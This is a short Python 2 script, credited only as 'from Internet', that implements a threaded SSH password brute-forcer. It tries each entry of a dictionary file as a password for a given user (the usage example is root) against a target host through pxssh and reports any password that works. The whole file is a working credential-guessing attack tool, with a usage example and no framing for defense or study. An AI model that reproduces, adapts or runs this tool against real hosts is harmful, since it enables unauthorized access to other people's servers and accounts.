# -*- coding: utf-8 -*-
'''
from Internet
'''
# -*- coding: utf-8 -*-
'''
usage
    import sshbrute
    sshbrute.sshbrute('192.168.1.12', 'dictionary.txt', 'root')
'''

import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()
def sshbrute(hostname,dictname,username):

    host = hostname
    passwdFile = dictname
    user = username
           
    fn = open(passwdFile, 'r')
    for line in fn.readlines():

        if Found:
            print "[*] Exiting: Password Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing: "+str(password)
        t = Thread(target=connect, args=(host, user,\
          password, True))
        child = t.start()


